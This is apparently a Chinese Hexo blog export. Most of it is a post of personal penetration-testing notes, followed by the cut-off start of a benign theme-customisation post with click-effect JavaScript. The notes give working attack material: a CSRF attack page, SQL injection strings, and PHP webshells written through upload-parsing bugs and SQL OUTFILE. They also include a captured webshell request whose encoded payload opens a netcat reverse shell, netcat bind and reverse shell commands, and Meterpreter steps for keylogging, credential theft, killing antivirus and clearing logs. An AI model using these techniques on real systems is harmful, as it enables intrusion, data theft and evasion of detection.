    <content><![CDATA[<!-- build time:Wed Apr 01 2020 18:35:20 GMT+0800 (中国标准时间) --><p>最近在整理印象笔记，其中有许许多多经验、研究和杂七杂八的想法，我会逐步上传到博客。<br><img src="https://i.loli.net/2018/02/10/5a7e9cdf1cedb.png" alt="印象笔记截图.PNG"></p><a id="more"></a><h1 id="渗透笔记"><a href="#渗透笔记" class="headerlink" title="渗透笔记"></a>渗透笔记</h1><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>CSRF全名是Cross-site request forgery，理解上为伪造其他用户执行操作。</p><h3 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h3><p>网页没有token头字段，通过请求拦截的方式，将对应URL记录下来。通过构建一个恶意页面，恶意页面代码如下:</p><figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line"><span class="comment"># GET类型</span></span><br><span class="line">&lt;img src=<span class="string">"操作行为的URL"</span>&gt; </span><br><span class="line"></span><br><span class="line"><span class="comment"># POST类型</span></span><br><span class="line">&lt;form <span class="built_in">id</span>=<span class="string">"aa"</span> action=<span class="string">"操作行为的UR"</span> method=<span class="string">"post"</span> <span class="built_in">name</span>=<span class="string">"form1"</span>/&gt;</span><br><span class="line">&lt;input type=<span class="string">"submit"</span> <span class="built_in">name</span>=<span class="string">"button"</span> <span class="built_in">id</span>=<span class="string">"button"</span> style=<span class="string">"display:none;"</span>/&gt;</span><br><span class="line">&lt;<span class="keyword">script</span>&gt;window.location = <span class="string">"http://x.x.x.x"</span>;&lt;/<span class="keyword">script</span>&gt;</span><br></pre></td></tr></table></figure><p>诱使对应人员点击该页面即可触发CSRF攻击。</p><h3 id="防御思路"><a href="#防御思路" class="headerlink" title="防御思路"></a>防御思路</h3><p>针对CSRF攻击，防御方面：</p><ol><li>在重要操作执行钱需要进行验证码校验</li><li>站点添加token（或者自定义）头字段。由于token是随机并且一次性。在使用post方法时，防止token出现在URL（可以通过构建恶意网站 使用户访问恶意网站 恶意网站在后台构建假冒用户操作）<br>通过抓包删除referer 测试<br>针对CSRF攻击总结：防御方面为对操作进行用户身份验证；攻击方面可以构建的代码：form iframe img xhr link等。<h3 id="攻击衍生"><a href="#攻击衍生" class="headerlink" title="攻击衍生"></a>攻击衍生</h3>可以将XSS与CSRF结合：通过XSS让用户跳转到CSRF页面执行恶意操作。</li></ol><h2 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h2><p>SQL Injection通过把SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。</p><h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>最简单的注入思路就是针对id=、class=这些参数进行注入。看到过一次二次注入的思路：注册用户时将用户名设置成注入语句，在个人中心处注入语句被调用形成注入。因此，允许输入与数据库交互那么便有可能存在注入。例如cookie等报文头里面的数据，如果数据库会记录该数据那变可能存在注入。</p><h3 id="攻击衍生-1"><a href="#攻击衍生-1" class="headerlink" title="攻击衍生"></a>攻击衍生</h3><p>当站点对输入进行过滤（防御），可以尝试使用编码转换，将注入语句转码。</p><h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><p>内网渗透是指渗透人员获取了一台内网主机时，针对内网进行内网渗透的过程。</p><figure class="highlight vala"><table><tr><td class="code"><pre><span class="line">Windows</span><br><span class="line"><span class="meta"># 查看用户权限</span></span><br><span class="line">whoami</span><br><span class="line"><span class="meta"># 提权 </span></span><br><span class="line">pr </span><br><span class="line"><span class="meta"># 开启远程桌面</span></span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="string">" "</span>Server /v fDenyTSConnections /t REG_DWORD /d <span class="number">0</span> /f</span><br><span class="line"><span class="meta"># 查看计算机信息</span></span><br><span class="line">systeminfo</span><br><span class="line"><span class="meta"># 获取密码</span></span><br><span class="line">mimikatz</span><br><span class="line"><span class="meta"># 进程信息</span></span><br><span class="line">tasklist /svc </span><br><span class="line"><span class="meta"># 查看端口 </span></span><br><span class="line">netstart -an</span><br></pre></td></tr></table></figure><h2 id="上传漏洞"><a href="#上传漏洞" class="headerlink" title="上传漏洞"></a>上传漏洞</h2><h3 id="IIS6-0"><a href="#IIS6-0" class="headerlink" title="IIS6.0"></a>IIS6.0</h3><p>1.目录名称为a.asp，该目录下的文件都会以asp解析；<br>2.上传a.asp;.xx.jpg类型的文件，由于IIS6.0解析”;”会截断，所以在解析时可以理解为以asp文件类型解析。</p><h3 id="IIS7-0-7-5-Nginx≤0-8-37"><a href="#IIS7-0-7-5-Nginx≤0-8-37" class="headerlink" title="IIS7.0/7.5+Nginx≤0.8.37"></a>IIS7.0/7.5+Nginx≤0.8.37</h3><p>IIS7.0/7.5，在PHP配置文件中，开启了cgi.fix_pathinfo（该配置默认开启），当文件为php类型，iis会交给php解析；<br>nginx和iis7.5类似:<br>Fast-CGI开启状况（默认），上传内容为:</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> fputs(fopen(<span class="string">'cmd.php'</span>,<span class="string">'w'</span>),<span class="string">'&lt;?php eval($_POST[cmd])?&gt;'</span>);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>的x.jpg。访问../../../x.jpg/.php会在根目录下生成一个cmd.php;</p><ol><li>在文本前面加上 Gif89a 让服务器以为该文本为图片类型文件;</li><li>双文件上传 通过在上传<code>&lt;input type=&quot;FileName&quot; type=&quot;FILE&quot;&gt;</code>后面在加入<code>&lt;input type=&quot;FileName&quot; type=&quot;FILE&quot;&gt;</code>。下载网页源码 另存为到桌面 然后第一个地方上传正常图片 第二个地方上传马;</li><li>上传一句话木马可以对一句话多次加密。<br>上传成功之后，如果连接一句话被防护设备阻断，可以通过修改菜刀进行连接。原理是因为当前防护设备是针对网络流量进行识别，当流量中出现对应关键字会进入识别流程，当所有条件都满足时就会阻断该流量。该方式绕过方式千千万，只要特征不命中即可。</li></ol><h2 id="SQL命令"><a href="#SQL命令" class="headerlink" title="SQL命令"></a>SQL命令</h2><p>记录MySQL数据库在渗透的时候可以用到的命令：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 导出文件</span></span><br><span class="line"><span class="keyword">Select</span> <span class="string">'&lt;? php eval($_POST[cmd]);?&gt;'</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'F:/wwwroot/eval.php'</span>;</span><br><span class="line"><span class="comment">## 导出一句话</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> cmd (a <span class="built_in">varchar</span>(<span class="number">50</span>));</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> cmd (a) <span class="keyword">values</span> (<span class="string">'一句话木马'</span>);</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">into</span> [a] <span class="keyword">in</span> <span class="string">'e:\web\webshellcc\1.asa;x.xls'</span> <span class="string">'excel 4.0;'</span><span class="keyword">from</span> cmd;</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> cmd;</span><br><span class="line"><span class="keyword">Select</span> <span class="string">'asp一句话木马'</span> <span class="keyword">into</span> [vote] <span class="keyword">in</span> <span class="string">'e:\web\webshellcc\1.asa;x.xls'</span> <span class="string">'excel 8.0;'</span> fromvote;</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">into</span> <span class="keyword">outfile</span>(<span class="keyword">dumpfile</span>);  //MySQL写文件命令 (例如：<span class="keyword">select</span> <span class="string">"&lt;?php echo 'test'; ?&gt;"</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">"F:\\www\\test.php"</span>;）</span><br><span class="line"></span><br><span class="line"><span class="comment"># 系统用户名</span></span><br><span class="line">system_user()</span><br><span class="line"><span class="comment"># 用户名</span></span><br><span class="line">user()</span><br><span class="line"><span class="comment"># 当前用户名</span></span><br><span class="line">current_user</span><br><span class="line"><span class="comment"># 连接数据库的用户名</span></span><br><span class="line">session_user()</span><br><span class="line"><span class="comment"># 数据库名</span></span><br><span class="line">database()</span><br><span class="line"><span class="comment"># MYSQL数据库版本</span></span><br><span class="line">version()</span><br><span class="line"><span class="comment"># MYSQL读取本地文件的函数</span></span><br><span class="line">load_file()</span><br><span class="line"><span class="comment"># 读取数据库路径</span></span><br><span class="line">@@datadir</span><br><span class="line"><span class="comment"># MYSQL 安装路径</span></span><br><span class="line">@@basedir</span><br><span class="line"><span class="comment"># 操作系统</span></span><br><span class="line">@@version_compile_os</span><br></pre></td></tr></table></figure><h2 id="PHP爆破路径"><a href="#PHP爆破路径" class="headerlink" title="PHP爆破路径"></a>PHP爆破路径</h2><p>1.错误参数爆路径<br>2.google搜索： sieze:xxx.com warning size:xxx.com phpmyadmin(phpMyadmin<br>3.测试文件爆路径 test.php ceshi.php info.php<br>4.注入点读取配置文件 load_file</p><h1 id="小迪学习笔记"><a href="#小迪学习笔记" class="headerlink" title="小迪学习笔记"></a>小迪学习笔记</h1><p>我在刚刚接触渗透的时候，经常会看小迪的渗透教程视频。那时候，边学边记。</p><h2 id="小迪第一讲"><a href="#小迪第一讲" class="headerlink" title="小迪第一讲"></a>小迪第一讲</h2><p>小迪第一讲主要讲解一下基础的知识，便于后期理解。<br>软件：APMServ</p><figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="comment"># web环境</span></span><br><span class="line"><span class="attr">iis6.0（Windows2003）</span></span><br><span class="line"><span class="meta">iis7.X（win7</span> <span class="string">Windows2008）</span></span><br><span class="line"><span class="meta">Apache（linux</span> <span class="string">Windows）</span></span><br><span class="line"><span class="comment"># 常见搭配</span></span><br><span class="line"><span class="attr">asp</span> <span class="string">+ access + iis</span></span><br><span class="line"><span class="attr">asp</span> <span class="string">+ sqlserver + iis</span></span><br><span class="line"><span class="attr">php</span> <span class="string">+ mysql + Apache tomcat </span></span><br><span class="line"><span class="attr">jsp</span> <span class="string">+ sqlserver + tomcat</span></span><br><span class="line"><span class="attr">jsp</span> <span class="string">+ oracle +tomcat</span></span><br><span class="line"><span class="attr">aspx</span> <span class="string">+ sqlserver + iis</span></span><br></pre></td></tr></table></figure><h2 id="小迪第四讲"><a href="#小迪第四讲" class="headerlink" title="小迪第四讲"></a>小迪第四讲</h2><p>一个页面 <a href="http://www.xxx.com/xxx.asp?id=xx,存在cookie注入。使用SQLMap进行攻击，命令如下：`sqlmap：" target="_blank" rel="noopener">http://www.xxx.com/xxx.asp?id=xx,存在cookie注入。使用SQLMap进行攻击，命令如下：`sqlmap：</a> sqlmap.py -u <a href="http://www.xxx.com/xxx.asp" target="_blank" rel="noopener">http://www.xxx.com/xxx.asp</a> –cookie “id=xx” –level 2`</p><h2 id="小迪第五讲"><a href="#小迪第五讲" class="headerlink" title="小迪第五讲"></a>小迪第五讲</h2><p>数字型注入：<code>and 1=1</code>。例如:<code>select from admin where id=1</code><br>字符型注入：<code>&#39; and &#39;1&#39;=&#39;1</code>,在代码处由于字符型需要加单引号或者双引号。例如:<code>select from admin where a=&#39;a&#39;</code><br>搜索型注入：<code>%&#39;</code></p><h2 id="小迪第七讲"><a href="#小迪第七讲" class="headerlink" title="小迪第七讲"></a>小迪第七讲</h2><p>通过 load_file 读取后台文件 例如：前台页面向后台login.php传递参数并判断然后跳转 这时候可以通过 load_file sql注入语句来读取login.php文件</p><h2 id="小迪第九讲"><a href="#小迪第九讲" class="headerlink" title="小迪第九讲"></a>小迪第九讲</h2><p>服务器常见状态码：</p><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>XX：正在处理</span><br><span class="line"><span class="number">2</span>XX：成功</span><br><span class="line"><span class="number">3</span>XX：重定向</span><br><span class="line"><span class="number">4</span>XX：客户端错误 <span class="number">403</span>：存在（没权限） <span class="number">404</span>：不存在</span><br><span class="line"><span class="number">5</span>XX：服务器错误 <span class="number">500</span>：可能存在</span><br></pre></td></tr></table></figure><h2 id="小迪第十讲"><a href="#小迪第十讲" class="headerlink" title="小迪第十讲"></a>小迪第十讲</h2><p>该课程主要讲解mssql综合利用工具，由于是工具利用，所以并没有详细记录。</p><h2 id="小迪第十一讲"><a href="#小迪第十一讲" class="headerlink" title="小迪第十一讲"></a>小迪第十一讲</h2><p>验证机制分为：本地、远程。本地验证可以通过禁用、删除等方式进行绕过。<br>解析漏洞：</p><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">IIS6<span class="number">.0</span>：</span><br><span class="line">文件名： <span class="number">1.</span>asp;.jpg</span><br><span class="line">文件夹：用户名为 <span class="number">1.</span>asp  文件类型：<span class="number">1.</span>jpg</span><br><span class="line"></span><br><span class="line">IIS7.X   uginx：</span><br><span class="line">http:<span class="comment">//www.xxx.com/logo.gif</span></span><br><span class="line">解析漏洞:http:<span class="comment">//www.xxx.com/logo.gif/x/php</span></span><br><span class="line"></span><br><span class="line">apache:</span><br><span class="line">首先是否系统能否解析的后缀名</span><br><span class="line">http:<span class="comment">//www.xxx.com/logo.php.asdasd  最后的后缀无法识别 便继续往前推</span></span><br></pre></td></tr></table></figure><h2 id="小迪第十二讲"><a href="#小迪第十二讲" class="headerlink" title="小迪第十二讲"></a>小迪第十二讲</h2><p>IIS 解析漏洞利用<code>path：a.asp;.</code>,在上传的时候通过修改文件前缀。不单单是文件前缀，如果上传包中存在path，可以通过修改path。因为有时候验证是通过文件名<code>filename</code>，而不验证filepath。<br>图片马使用UE（uedit）编辑器即可添加。</p><h2 id="小迪第十四讲"><a href="#小迪第十四讲" class="headerlink" title="小迪第十四讲"></a>小迪第十四讲</h2><p>针对上传绕过时，首先需要知道过滤方式。可通过多次上传来猜解其过滤方式。<br>利用手段</p><ol><li>00截断：1.asp’\0’.jpg:</li><li>通过UE将上传包保存为文本文档在上传文件名后面加上：空格 .jpg。例如　1.asp .jpg。</li><li>通过UE将空格 20 修改为 00</li><li>在上传包文本中 包长度 length 数值加5</li><li>检验文件类型 通过抓包修改</li><li>过滤不全 asp asa cer cdx htr</li><li>检验文件头：在文件头前面加上 GIF89a</li></ol><h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><h2 id="一句话流量学习"><a href="#一句话流量学习" class="headerlink" title="一句话流量学习"></a>一句话流量学习</h2><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"># url执行命令</span><br><span class="line">POST /test.php HTTP/<span class="number">1.1</span></span><br><span class="line">X-Forwarded-For: <span class="number">199.1</span><span class="number">.88</span><span class="number">.29</span></span><br><span class="line">Referer: http:<span class="comment">//192.168.168.147</span></span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows; Windows NT <span class="number">5.1</span>; en-US) Firefox/<span class="number">3.5</span><span class="number">.0</span></span><br><span class="line">Host: <span class="number">192.168</span><span class="number">.168</span><span class="number">.147</span></span><br><span class="line">Content-Length: <span class="number">569</span></span><br><span class="line">Cache-Control: no-cache</span><br><span class="line"></span><br><span class="line">cmd=@eval(base64_decode($_POST[z0]));&amp;z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%<span class="number">2</span>BfCIpOzskcD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JHM9YmFzZTY0X2RlY29kZSgkX1BPU1RbInoyIl0pOyRkPWRpcm5hbWUoJF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdKTskYz1zdWJzdHIoJGQsMCwxKT09Ii8iPyItYyAneyRzfSciOiIvYyB7JHN9Ijskcj0ieyRwfSB7JGN9IjtAc3lzdGVtKCRyLiIgMj4mMSIpOztlY2hvKCJ8PC0iKTtkaWUoKTs%<span class="number">3</span>D&amp;z1=L2Jpbi9zaA%<span class="number">3</span>D%<span class="number">3</span>D&amp;z2=Y2QgIi92YXIvd3d3L2h0bWwvIjtuYyAxOTIuMTY4LjEwLjExIDEzMzcgLWUgL2Jpbi9iYXNoO2VjaG8gW1NdO3B3ZDtlY2hvIFtFXQ%<span class="number">3</span>D%<span class="number">3</span>D</span><br></pre></td></tr></table></figure><h2 id="NC工具"><a href="#NC工具" class="headerlink" title="NC工具"></a>NC工具</h2><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">正向连接：</span><br><span class="line">     服务器命令：nc -l -p <span class="number">1337</span> -e /bin/bash</span><br><span class="line">     客服端使用：nc &gt;nc x.x.x.x <span class="number">1337</span></span><br><span class="line">反向连接：</span><br><span class="line">     服务器命令：nc <span class="number">192.168</span><span class="number">.10</span><span class="number">.11</span> <span class="number">1337</span> -e /bin/bash</span><br><span class="line">     客户发命令：nc -lvv -p <span class="number">1337</span></span><br></pre></td></tr></table></figure><h2 id="Metasploit-msfconsole工具"><a href="#Metasploit-msfconsole工具" class="headerlink" title="Metasploit-msfconsole工具"></a>Metasploit-msfconsole工具</h2><p>Metasploit是一个优秀的渗透测试框架！！！！！！！</p><h3 id="攻击阶段："><a href="#攻击阶段：" class="headerlink" title="攻击阶段："></a>攻击阶段：</h3><p>使用<code>msfconsole</code>打开Metasploit<br><img src="https://i.loli.net/2018/02/01/5a72887f8fa7c.png" alt="Image.png"><br>使用nmap扫描来发现开放端口<code>nmap -T4 -A -v x.x.x.x</code><br><img src="https://i.loli.net/2018/02/01/5a72887f463a8.png" alt="nmap.png"><br>使用<code>search</code>命令来搜索需要的exp<br><img src="https://i.loli.net/2018/02/01/5a72887f68d46.png" alt="search.png"><br>使用<code>use</code>命令来打开exp，之后使用<code>show options</code>查看需要指定的参数<br><img src="https://i.loli.net/2018/02/01/5a72887f74851.png" alt="show.png"><br>使用<code>set rhost</code>等来设置参数之后，通过exploit来获取meterpreter会话<br><img src="https://i.loli.net/2018/02/01/5a72887ec17c9.png" alt="set.png"></p><h3 id="信息收集阶段："><a href="#信息收集阶段：" class="headerlink" title="信息收集阶段："></a>信息收集阶段：</h3><p>获取服务器信息（sysinfo、getuid、idletime、run get_env、ifconfig、route）<br><img src="https://i.loli.net/2018/02/01/5a72887e8e564.png" alt="systeminfo.png"><br>获取服务器当前截屏（screenshot）<br><img src="https://i.loli.net/2018/02/01/5a72887e4fe74.png" alt="screenshot.png"><br>获取服务器进程信息（ps）<br><img src="https://i.loli.net/2018/02/01/5a7289b431615.png" alt="ps.png"><br>将 meterpreter会话迁移至explorer（migrate）<br><img src="https://i.loli.net/2018/02/01/5a7289d322ff9.png" alt="migrate.png"><br>开启键盘记录，输出（keyscan_start、keyscan_dump）<br><img src="https://i.loli.net/2018/02/01/5a728a054d981.png" alt="keyscan.png"><br>获取服务器shell（shell）<br><img src="https://i.loli.net/2018/02/01/5a728a1898d4f.png" alt="shell.png"><br>检测服务器是否为虚拟机（run checkvm）<br><img src="https://i.loli.net/2018/02/01/5a728a282f164.png" alt="checkvm.png"><br>启动远程桌面（run getgui -e）;启动telnet服务（run gettelnet -e）<br><img src="https://i.loli.net/2018/02/01/5a728a46f3eef.png" alt="getgui.png"><br>获取子网状况（run get_local_subnets）<br><img src="https://i.loli.net/2018/02/01/5a728a5e0d4c4.png" alt="get_local_subnets.png"><br>编辑hosts（run hostedit）<br><img src="https://i.loli.net/2018/02/01/5a728a70d5e82.png" alt="hostedit.png"><br>查看已经登录的用户数（run enum_logged_on_users）<br><img src="https://i.loli.net/2018/02/01/5a728a8982a29.png" alt="enum_logged_on_users.png"><br>获取已安装应用程序（run get_application_list）<br><img src="https://i.loli.net/2018/02/01/5a728a9a7c456.png" alt="get_application_list.png"><br>获取驱动器信息（run windows/gather/forensics/enum_drives）<br><img src="https://i.loli.net/2018/02/01/5a728ab029e5b.png" alt="enum_drives.png"><br>获取产品密钥（run windows/gather/enum_ms_product_keys）<br><img src="https://i.loli.net/2018/02/01/5a728aca70e64.png" alt="enum_ms_product_keys.png"><br>获取autologin（run windows/gather/credentials/windows_autologin）<br><img src="https://i.loli.net/2018/02/01/5a728adf85729.png" alt="autologin.png"><br>使用自动脚本获取系统信息（run winenum）<br><img src="https://i.loli.net/2018/02/01/5a728af0d260d.png" alt="winenum.png"><br>获取服务器额外信息（run scraper；信息存放路径为：.msf5/logs/scrips/scraper/192.x.x.x.x）<br><img src="https://i.loli.net/2018/02/01/5a728b0537bf6.png" alt="scraper.png"></p><h3 id="清理痕迹阶段："><a href="#清理痕迹阶段：" class="headerlink" title="清理痕迹阶段："></a>清理痕迹阶段：</h3><p>检测防火墙状态（run getcountermeasure）<br><img src="https://i.loli.net/2018/02/01/5a728b2a7b573.png" alt="getcountermeasure.png"><br>关闭杀毒软件（run killav；find / -name ‘killav.rb’；/usr/share/metasploit-framework/scripts/meterpreter/killav.rb）<br><img src="https://i.loli.net/2018/02/01/5a728b41c549d.png" alt="killav.png"><br>清理日志（clearev）<br><img src="https://i.loli.net/2018/02/01/5a728b4fec7ed.png" alt="clearev.png"></p><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><p>Nmap常用命令汇总记录</p><figure class="highlight diff"><table><tr><td class="code"><pre><span class="line">Nmap常用命令参数讲解</span><br><span class="line"><span class="deletion">-d [level] (提高或设置调试级别) 。 </span></span><br><span class="line"><span class="deletion">-sT tcp端口扫描(完整三次握手)。</span></span><br><span class="line"><span class="deletion">-sU udp扫描。(不回应可能端口打开,回应是关闭) </span></span><br><span class="line"><span class="deletion">-sL dns反向解析。    </span></span><br><span class="line"><span class="deletion">-sM[fin ack mainmon扫描] 。</span></span><br><span class="line"><span class="deletion">-sS隐蔽扫描(半开syn)。</span></span><br><span class="line"><span class="deletion">-sP发现扫描网络存活主机。(直连arp非直连tcp80 icmp)</span></span><br><span class="line"><span class="deletion">-sO确定主机协议扫描。</span></span><br><span class="line"><span class="deletion">-sA tcp ACK扫描。</span></span><br><span class="line"><span class="deletion">-sW 对滑动窗口的扫描sI[idlescan]。</span></span><br><span class="line"><span class="deletion">-sR  RPC扫描。(flag没有syn,ack,rst回送rst)</span></span><br><span class="line"><span class="deletion">-sN 关闭主机发现【空】。(不管是否存在直接扫描)</span></span><br><span class="line"><span class="deletion">-sF FIN扫描 。(sN sF sX逃避不了ids)</span></span><br><span class="line"><span class="deletion">-sX Xmas扫描 (fin psh urg为置位)。</span></span><br><span class="line"><span class="deletion">-sI 完全隐藏。【以一个跳板主机&#123;无流量&#125;扫描另一台主机】</span></span><br><span class="line"><span class="deletion">-sV 服务版本。</span></span><br><span class="line"><span class="deletion">-sC 跟安全有关的脚本</span></span><br><span class="line"><span class="deletion">-P0 指定协议。(不ping主机)(1icmp6tcp17udp47gre50esp51ah53swipe77sun-nd115l2tp120uti132sctp) </span></span><br><span class="line"><span class="deletion">-PS 端口列表用,隔开[tcp80 syn 扫描]</span></span><br><span class="line"><span class="deletion">-PA 端口列表用,隔开[ack扫描](PS+PA测试状态包过滤防火墙【非状态的PA可以过】)【默认扫描端口1-1024】</span></span><br><span class="line"><span class="deletion">-PU 端口列表用,隔开[udp高端口扫描 穿越只过滤tcp的防火墙]</span></span><br><span class="line"><span class="deletion">-PE [icmp ping types]</span></span><br><span class="line"><span class="deletion">-PM 掩码请求。</span></span><br><span class="line"><span class="deletion">-PR [arp ping] 默认直连用。</span></span><br><span class="line"><span class="deletion">-PN 自己。</span></span><br><span class="line"><span class="deletion">-PP 时间请求。</span></span><br></pre></td></tr></table></figure><h2 id="GoogleHack"><a href="#GoogleHack" class="headerlink" title="GoogleHack"></a>GoogleHack</h2><p>使用Google搜索往往能获得意想不到的信息。</p><figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line">ps：不区分大小写</span><br><span class="line">all开头一次查询只能使用一个</span><br><span class="line"><span class="symbol">intext:</span>关键词 （搜索页面正文包含关键词的网页）</span><br><span class="line"><span class="symbol">allintext:</span>关键词,关键词 （拼接多个关键词）</span><br><span class="line"><span class="symbol">intitle:</span>关键词 （搜索页面标题包含关键词的网页）</span><br><span class="line"><span class="symbol">allintitle:</span>关键词,关键词 （拼接多个关键词）</span><br><span class="line"><span class="symbol">cache:</span>url （搜索特定页面的快照）</span><br><span class="line"><span class="symbol">defind:</span>关键词 （搜索关于关键词的定义，不能与其他操作符混用）</span><br><span class="line"><span class="symbol">filetype:</span>关键词 （搜索所有以关键词为后缀的文件的url） </span><br><span class="line"><span class="symbol">ext:</span>关键词 （性质与filetype一致）</span><br><span class="line"><span class="symbol">info:</span></span><br><span class="line">    搜索输入URL的摘要信息和其他相关信息，该操作符不能与其他操作符及关键字混用</span><br><span class="line"><span class="symbol">inurl:</span>关键词 （搜索url中包含关键词的网页）</span><br><span class="line"><span class="symbol">allinurl:</span>关键词,关键词 （搜索url中包含多个关键词的网页）</span><br><span class="line"><span class="symbol">site:</span>url （将搜索范围缩小到特定的网站，域或子域）</span><br><span class="line">*（通配符）</span><br><span class="line">-（排除符号）</span><br></pre></td></tr></table></figure><!-- rebuild by neat -->]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>Blog美化</title>
    <url>/archives/11804e57.html</url>
    <content><![CDATA[<!-- build time:Wed Apr 01 2020 18:35:20 GMT+0800 (中国标准时间) --><p>本篇文章记录nexT主题的美化工作。<br>效果图呈现：<br><img src="https://i.loli.net/2018/01/16/5a5e1291b3c4f.png" alt="博客首页效果.png"></p><a id="more"></a><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>通过<a href="/archives/d6a90b9.html" title="Blog更新&amp;配置文件详解">Blog更新&amp;配置文件详解</a>的内容基本能满足大部分的需求，如果想要逼格高一点、深度优化，可以对里面的一些文件（swig、js等）进行新增、修改等。</p><h1 id="美化"><a href="#美化" class="headerlink" title="美化"></a>美化</h1><h2 id="点击特效"><a href="#点击特效" class="headerlink" title="点击特效"></a>点击特效</h2><p>点击特效可通过JS来实现，大家可以选择自己喜欢的特效，调用JS即可。我选择的是点击桃心特效，js源码如下：</p><figure class="highlight clojure"><table><tr><td class="code"><pre><span class="line">(<span class="name">function</span>(<span class="name">window</span>,document,undefined)&#123;</span><br><span class="line">  var hearts = []<span class="comment">;</span></span><br><span class="line">  window.requestAnimationFrame = (<span class="name">function</span>()&#123;</span><br><span class="line">    return window.requestAnimationFrame ||</span><br><span class="line">      window.webkitRequestAnimationFrame ||</span><br><span class="line">      window.mozRequestAnimationFrame ||</span><br><span class="line">      window.oRequestAnimationFrame ||</span><br><span class="line">      window.msRequestAnimationFrame ||</span><br><span class="line">      function (<span class="name">callback</span>)&#123;</span><br><span class="line">        setTimeout(<span class="name">callback</span>,<span class="number">1000</span>/<span class="number">60</span>)<span class="comment">;</span></span><br><span class="line">      &#125;</span><br><span class="line">  &#125;)()<span class="comment">;</span></span><br><span class="line">  init()<span class="comment">;</span></span><br><span class="line">  function init()&#123;</span><br><span class="line">    css(<span class="string">".heart&#123;width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);&#125;.heart:after,.heart:before&#123;content: '';width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: absolute;&#125;.heart:after&#123;top: -5px;&#125;.heart:before&#123;left: -5px;&#125;"</span>)<span class="comment">;</span></span><br><span class="line">    attachEvent()<span class="comment">;</span></span><br><span class="line">    gameloop()<span class="comment">;</span></span><br><span class="line">  &#125;</span><br><span class="line">  function gameloop()&#123;</span><br><span class="line">    for(<span class="name"><span class="builtin-name">var</span></span> i=0;i&lt;hearts.length;i++)&#123;</span><br><span class="line">      if(<span class="name">hearts</span>[i].alpha &lt;=0)&#123;</span><br><span class="line">        document.body.removeChild(<span class="name">hearts</span>[i].el)<span class="comment">;</span></span><br><span class="line">        hearts.splice(<span class="name">i</span>,<span class="number">1</span>)<span class="comment">;</span></span><br><span class="line">        continue;</span><br><span class="line">      &#125;</span><br><span class="line">      hearts[i].y--;</span><br><span class="line">      hearts[i].scale += <span class="number">0.004</span><span class="comment">;</span></span><br><span class="line">      hearts[i].alpha -= <span class="number">0.013</span><span class="comment">;</span></span><br><span class="line">      hearts[i].el.style.cssText = <span class="string">"left:"</span>+hearts[i].x+<span class="string">"px;top:"</span>+hearts[i].y+<span class="string">"px;opacity:"</span>+hearts[i].alpha+<span class="string">";transform:scale("</span>+hearts[i].scale+<span class="string">","</span>+hearts[i].scale+<span class="string">") rotate(45deg);background:"</span>+hearts[i].color;</span><br><span class="line">    &#125;</span><br><span class="line">    requestAnimationFrame(<span class="name">gameloop</span>)<span class="comment">;</span></span><br><span class="line">  &#125;</span><br><span class="line">  function attachEvent()&#123;</span><br><span class="line">    var old = typeof window.onclick===<span class="string">"function"</span> &amp;&amp; window.onclick;</span><br><span class="line">    window.onclick = function(<span class="name">event</span>)&#123;</span><br><span class="line">      old &amp;&amp; old()<span class="comment">;</span></span><br><span class="line">      createHeart(<span class="name">event</span>)<span class="comment">;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  function createHeart(<span class="name">event</span>)&#123;</span><br><span class="line">    var d = document.createElement(<span class="string">"div"</span>)<span class="comment">;</span></span><br><span class="line">    d.className = <span class="string">"heart"</span><span class="comment">;</span></span><br><span class="line">    hearts.push(&#123;</span><br><span class="line">      el : d,</span><br><span class="line">      x : event.clientX - <span class="number">5</span>,</span><br><span class="line">      y : event.clientY - <span class="number">5</span>,</span><br><span class="line">      scale : <span class="number">1</span>,</span><br><span class="line">      alpha : <span class="number">1</span>,</span><br><span class="line">      color : randomColor()</span><br><span class="line">    &#125;)<span 